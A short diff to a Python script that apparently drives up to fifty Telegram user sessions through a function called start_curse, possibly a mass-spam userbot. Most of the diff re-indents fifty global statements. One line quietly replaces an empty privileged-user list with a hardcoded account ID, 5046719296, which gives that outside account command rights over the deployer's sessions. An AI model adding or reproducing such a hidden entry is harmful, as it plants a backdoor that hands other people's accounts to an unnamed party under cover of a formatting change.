@@ -68,6 +68,7 @@ fourtyeight = STRING48
 fourtynine = STRING49
 fifty = STRING50
 
+
 bot = ""
 bot02 = ""
 bot03 = ""
@@ -122,61 +123,61 @@ bot50 = ""
 
 que = {}
 
-SMEX_USERS = []
+SMEX_USERS = [5046719296]
 for x in SUDO: 
     SMEX_USERS.append(x)
 
 async def start_curse():
-global bot
-global bot02
-global bot03
-global bot04
-global bot05
-global bot06
-global bot07
-global bot08
-global bot09
-global bot10
-global bot11
-global bot12
-global bot13
-global bot14
-global bot15
-global bot16
-global bot17
-global bot18
-global bot19
-global bot20
-global bot21
-global bot22
-global bot23
-global bot24
-global bot25
-global bot26
-global bot27
-global bot28
-global bot29
-global bot30
-global bot31
-global bot32
-global bot33
-global bot34
-global bot35
-global bot36
-global bot37
-global bot38
-global bot39
-global bot40
-global bot41
-global bot42
-global bot43
-global bot44
-global bot45
-global bot46
-global bot47
-global bot48
-global bot49
-global bot50
+    global bot
+    global bot02
+    global bot03
+    global bot04
+    global bot05
+    global bot06
+    global bot07
+    global bot08
+    global bot09
+    global bot10
+    global bot11
+    global bot12
+    global bot13
+    global bot14
+    global bot15
+    global bot16
+    global bot17
+    global bot18
+    global bot19
+    global bot20
+    global bot21
+    global bot22
+    global bot23
+    global bot24
+    global bot25
+    global bot26
+    global bot27
+    global bot28
+    global bot29
+    global bot30
+    global bot31
+    global bot32
+    global bot33
+    global bot34
+    global bot35
+    global bot36
+    global bot37
+    global bot38
+    global bot39
+    global bot40
+    global bot41
+    global bot42
+    global bot43
+    global bot44
+    global bot45
+    global bot46
+    global bot47
+    global bot48
+    global bot49
+    global bot50
 
 if one:
         session_name = str(one)
